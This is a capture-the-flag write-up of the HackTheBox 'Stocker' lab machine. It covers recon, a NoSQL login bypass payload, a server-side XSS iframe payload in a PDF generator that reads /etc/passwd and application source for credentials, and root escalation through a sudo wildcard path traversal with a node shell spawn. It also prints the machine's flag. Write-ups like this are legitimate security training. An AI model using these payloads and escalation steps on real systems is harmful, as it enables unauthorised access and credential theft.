---
description: HackTheBox Stocker Writeup
cover: ../.gitbook/assets/image (2) (1).png
coverY: 0
---

# \[Easy] Stocker

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>Machine stats</p></figcaption></figure>

### Recon <a href="#recon" id="recon"></a>

#### Services <a href="#services" id="services"></a>

`nmap`: **22 - SSH** and port **80 - nginx**.

```nmap
PORT      STATE  SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|  3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|  256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp    open  http        nginx 1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-title: Stock - Coming Soon!
| http-methods:
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 4EB67963EC58BC699F15F80BBE1D91CC
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

#### Subdomains <a href="#subdomains" id="subdomains"></a>

`gobuster`: dev.stocker.htb

```bash
➜  ~ gobuster vhost --url http://stocker.htb/ --wordlist ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 100
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb/
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /home/ennl/Wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/02/07 19:01:27 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
```

#### Website <a href="#website" id="website"></a>

So now, we have plain `stocker.htb` page without anything, and subdomain page `dev.stocker.htb` with redirect to `dev.stocker.htb/login`.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### Authentication bypass via NoSQL <a href="#authentication-bypass-via-nosql" id="authentication-bypass-via-nosql"></a>

[https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass)

I found that the login is susceptible to NoSQL Authentication Bypass after experimenting with various methods. We can bypass auth using

```
{"username": {"$ne": null}, "password": {"$ne": null} }
```

so, POST-request in BurpSuite gonna be look like:

```http
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AglWx1W4l6AXfs4gYZq-X2EzGPvkRAknn.aTADasosaVSVpIrCRQR6U5P%2BRe8JeRJwk6aNyTMXe1Q
Upgrade-Insecure-Requests: 1
token: ddac62a28254561001277727cb397baf

{"username": {"$ne": null}, "password": {"$ne": null} }
```

Once the request has been modified, you get an auth bypass:

<figure><img src="http://localhost:1313/stocker/0.png" alt=""><figcaption></figcaption></figure>

In browser:

<figure><img src="http://localhost:1313/stocker/1.png" alt=""><figcaption></figcaption></figure>

### Client-Side XXS <a href="#client-side-xxs" id="client-side-xxs"></a>

Now, via page `/stock` add product to basket and intercept HTTP-request with BurpSuite.

<figure><img src="http://localhost:1313/stocker/1.png" alt=""><figcaption></figcaption></figure>

We have an API `/api/order` to make an order, which sends the \`\`\`basket" as a parameter.

And order details are available on /api/po/ID.V

`/api/order` is a dynamic PDF generator, which has vulnerable to Server Side XSS parameter `title`.

{% embed url="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf" %}

```
{"basket":[{"_id":"638f116eeb060210cbd83a91","title":"<iframe src=file:///etc/passwd height='1500'  width='700' ></iframe>","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":3}]}
```

Response:

<figure><img src="http://localhost:1313/stocker/3.png" alt=""><figcaption></figcaption></figure>

Do the same with `file:///var/www/dev/index.js` and get user SSH password.

![1.png](http://localhost:1313/stocker/4.png)

### Privelege Escalation <a href="#privelege-escalation" id="privelege-escalation"></a>

`sudo -l`:

```bash
angoose@stocker:~$ sudo -l 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

We got a wildcard in the path, which means we can put another path in place of that wildcard, but we still should use node.js.

[https://gtfobins.github.io/gtfobins/node/](https://gtfobins.github.io/gtfobins/node/)

Create a `root.js` in user dir:

```bash
angoose@stocker:~$ nano root.js

node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

Then, start it by:

```bash
angoose@stocker:~$ sudo node /usr/local/scripts/../../../home/angoose/root.js
```

And get the root:

```bash
bash-5.0# cat /root/root.txt

f7723bd4b96f3cd26788fcb4f4714b08

```
